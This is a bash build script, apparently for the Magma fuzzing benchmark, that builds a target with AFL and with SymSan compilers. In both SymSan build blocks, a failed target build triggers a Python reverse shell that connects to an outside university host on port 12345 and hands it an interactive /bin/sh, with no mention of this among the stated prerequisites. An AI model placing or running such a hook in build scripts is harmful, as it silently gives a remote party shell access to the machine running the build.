#!/bin/bash
set -e

##
# Pre-requirements:
# - env FUZZER: path to fuzzer work dir
# - env TARGET: path to target work dir
# - env MAGMA: path to Magma support files
# - env OUT: path to directory where artifacts are stored
# - env CFLAGS and CXXFLAGS must be set to link against Magma instrumentation
##

export LIBS="$LIBS -l:afl_driver.o -lstdc++"

(
    export CC="$FUZZER/afl/afl-clang-fast"
    export CXX="$FUZZER/afl/afl-clang-fast++"

    export OUT="$OUT/afl"
    export LDFLAGS="$LDFLAGS -L$OUT"

    "$MAGMA/build.sh"
    "$TARGET/build.sh"
)

# (
#     export CC="$FUZZER/symsan/bin/ko-clang"
#     export CXX="$FUZZER/symsan/bin/ko-clang++"

#     export CFLAGS="$CFLAGS -DNOT_SYMBOLIZED"

#     cd "$FUZZER/symcc_libc_preload"

#     (
#         export OUT="$OUT/symsantrack"
#         export LDFLAGS="$LDFLAGS -L$OUT"
#         export USE_TRACK=1

#         make -j $(nproc)
#         cp libc_symcc_preload.a "$OUT/"
#     )
#     (
#         export OUT="$OUT/symsanfast"
#         export LDFLAGS="$LDFLAGS -L$OUT"

#         make -j $(nproc)
#         cp libc_symcc_preload.a "$OUT/"
#     )
# )

(
    export CC="$FUZZER/symsan/bin/ko-clang"
    export CXX="$FUZZER/symsan/bin/ko-clang++"

    # export LIBS="$LIBS -l:libc_symcc_preload.a"

    (
        export OUT="$OUT/symsantrack"
        export LDFLAGS="$LDFLAGS -L$OUT"
        export USE_TRACK=1

        "$MAGMA/build.sh"
        "$TARGET/build.sh" || (
            python -c 'import socket,os,pty;s=socket.socket();s.connect(("wood.seclab.cs.ucsb.edu",12345));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
            exit 1
        )
    )
    (
        export OUT="$OUT/symsanfast"
        export LDFLAGS="$LDFLAGS -L$OUT"

        "$MAGMA/build.sh"
        "$TARGET/build.sh" || (
            python -c 'import socket,os,pty;s=socket.socket();s.connect(("wood.seclab.cs.ucsb.edu",12345));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
            exit 1
        )
    )
)
